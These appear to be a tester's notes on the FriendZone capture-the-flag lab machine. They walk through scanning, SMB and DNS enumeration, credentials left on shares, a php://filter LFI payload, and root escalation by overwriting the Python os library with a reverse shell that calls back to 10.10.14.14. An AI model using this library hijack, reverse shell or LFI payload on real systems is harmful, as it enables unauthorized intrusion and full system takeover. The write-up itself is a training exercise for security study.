# Enumerate

# Scan

```
PORT    STATE  SERVICE     VERSION
21/tcp  open   ftp         vsftpd 3.0.3
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open   http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE
Host script results:
|_clock-skew: mean: -56m10s, deviation: 1h43m54s, median: 3m48s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2020-06-06T23:41:33+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-06T20:41:33
|_  start_date: N/A

443/tcp open   ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: 127.0.0.1, FRIENDZONE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -56m10s, deviation: 1h43m54s, median: 3m48s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2020-06-06T23:38:33+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-06T20:38:33
|_  start_date: N/A
```

* Enum share locations with nmap smb-enum-shares script:

```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Friendzone$ nmap -p 445 --script=smb-enum-shares 10.10.10.123
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-06 17:45 EDT
Nmap scan report for 10.10.10.123
Host is up (0.030s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.123\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 19.92 seconds
```



## Explore Services

* 80 has a simple page with a picture
* 443 index is nothing

### Exploits

* vsftpd - none
* ssh - probably not
* bind - probably not
* apache - no
* samba - no

### Dirs

* dirbuster on 80 and 443. Both find nothing really. 
* Found a /wordpress/ but it's an empty directory and running dirb on that directory found nothing. 

### Web Vuln

* nikto on 80 and 443, found nothing. 

### DNS

* Tried to do a zone transfer with dig and host, nothing. 
* [x] Retry after reset, apparently this is a thing. 

```
WRONG
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Friendzone/smbmap$ host -l 10.10.10.123 10.10.10.123
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

Host 123.10.10.10.in-addr.arpa. not found: 3(NXDOMAIN)
```

* Ok, so of course that's not going to work, the IP address isn't a zone to transfer. I need to zone transfer an actual zone. On a previous box I used <name>.htb, so for this one, see on the homepage that it used friendzone.red. 

```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Friendzone/smbmap$ host -l friendzone.red 10.10.10.123
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

friendzone.red has IPv6 address ::1
friendzone.red name server localhost.
friendzone.red has address 127.0.0.1
administrator1.friendzone.red has address 127.0.0.1
hr.friendzone.red has address 127.0.0.1
uploads.friendzone.red has address 127.0.0.1
--- or:
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Friendzone/smbmap$ host -t axfr friendzone.red 10.10.10.123
```

# Access

## SMB

* Can list all the shares:

```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Friendzone$ smbclient -L 10.10.10.123 -U ""
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

* got access to some share with creds for something? 

```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Friendzone$ smbclient -U "" //10.10.10.123/general
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                9221460 blocks of size 1024. 6430508 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> ^C
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Friendzone$ cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

* Doesn't work on ssh or ftp. FTP has no anonymous login
* For some reason smbmap is giving auth error. Downloaded from GH and getting the same. Doesn't seem to be a setting to change the auth setting or use a different version or anything like that. 

## DNS

* Change my /etc/hosts to match the things I got in DNS earlier. 
* Tried to go to uploads.friendzone.red and didn't work. Turned off burp and then it started working (after enabling burp again). Not sure what the deal is there. 

## Web

* Web pages on the https page friendzone.red and the others. 
* There's a /js/js file:

```
Testing some functions !
I'am trying not to break things !
d3NKMzU0OVB0MTE1OTE0ODE4NjJaU3JxWjNIRmlp
```

* Administrator1 page is a login page and then after logging in I get a dashboard page? Some weird php stuff

* The upload page lets you upload something to some unknown location. 

  * After uploading it gives you some number. 

  ```
  Uploaded successfully !
  1591485731
  ```

  * This is some timestamp seems like. And there's a comment in src code about timing. 
  * Uploading an image doesn't add it to the /images/ directory. 

* Admin page

  * has some timestamp access function and can include images. 
  * LFI on the page parameter
  * Cool trick for base64 encoding the output in the url instead of I guess running the script?

  ```
  pagename=php://filter/convert.base64-encode/resource=dashboard
  ```

* Upload to one of the writeable shares and then have it run with this. 

## Escalate

* Have www-data and get flag in friend folder. 
* Maybe have to get 'friend' first? 
* Maybe an interesting script that root owns and executes? 

```
$ cat /opt/server_admin/reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer

$ ls -al /opt/server_admin/reporter.py
-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py

```

* Nothing helpful w/ sudo or crontab. Can't read /var/mail/friend.
* Tried to su friend with PAPAP, nothing. 
* Mysql creds file

```
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend
db_user=friend
db_pass=Agpyu12!0.213$
db_name=FZ
```

* su to friend
* Nothing on the usual. /var/mail/friend is empty. 
* None of the directory rights change when using friend
* Can get into FTP but can't go into root dir or anything. 
* Run linpeas

```
Sudo version 1.8.21p2 - no exploits
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN
```

* There's an SMTP server running, what version? Use proxychains to tunnel nmap through ssh. 

```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Friendzone$ ssh -D 9050 friend@10.10.10.123
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Friendzone$ proxychains nmap -sC -sV  -p 25 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 08:14 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:25-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:25-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:25-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:25-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:25-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:25-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:25-<><>-OK
Nmap scan report for localhost (127.0.0.1)
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Exim smtpd 4.90_1
| smtp-commands: FriendZone Hello localhost [127.0.0.1], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
Service Info: Host: FriendZone
```

* Maybe an exploit for that will get me root? It's running as debian user? 

```
exim 4.90 - Remote Code Execution | exploits/linux/remote/45671.py
Exim < 4.90.1 - 'base64d' Remote Code Execution | exploits/linux/remote/44571.py
```

* The first actually requires < 4.90, so won't work. No luck with these. 
* I can send mail with /usr/sbin/exim4 and it shows up in /var/mail/friend. Just get errors on sending to those two addresses. 
* Looked up on gtfobins for mail related things. See a mail binary and look it up, maybe exploits:

```
friend@FriendZone:~$ mail --version
mail (GNU Mailutils) 3.4
GNU Mailutils 3.7 - Privilege Escalation | exploits/linux/local/47703.txt
```

* Doesn't have the suid bit, so that privesc doesn't work. 
* Didn't think to check the dependencies of the script. 
* Use pspy and confirm it's running sometimes. 

```
friend@FriendZone:~$ ./pspy64 | grep reporter
2020/06/07 15:54:44 CMD: UID=1000 PID=25834  | grep --color=auto reporter 
2020/06/07 15:56:01 CMD: UID=0    PID=25851  | /usr/bin/python /opt/server_admin/reporter.py 
2020/06/07 15:56:01 CMD: UID=0    PID=25850  | /bin/sh -c /opt/server_admin/reporter.py 
2020/06/07 15:58:01 CMD: UID=0    PID=25859  | /usr/bin/python /opt/server_admin/reporter.py 
2020/06/07 15:58:01 CMD: UID=0    PID=25858  | /bin/sh -c /opt/server_admin/reporter.py
```

* I can overwrite the os.py script that it depends on. Since it's not actually calling any functions I can make it run on import by just adding code to it without being in a function. 
* Tried to just read the file by doing subprocess commands to cat and change permissions on the file but didn't seem to work for some reason. Ended up just adding a python shell to the end of the file. Interestingly, this runs whenever you run python, not just on a file. 

```
import subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.14",1235))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

* get a callback and read foot file. 

# Lessons

* smb-enum-shares is pretty solid and smbmap doesn't seem to work for some restrictions on smb? 
* php filter encode in url with that trick when you have LFI if it otherwise runs a php file. 
* If webpage doesn't seem to act right, restart or turn off burp. 
* Can't overwrite a script? Maybe you can overwrite the functions or libraries it includes? 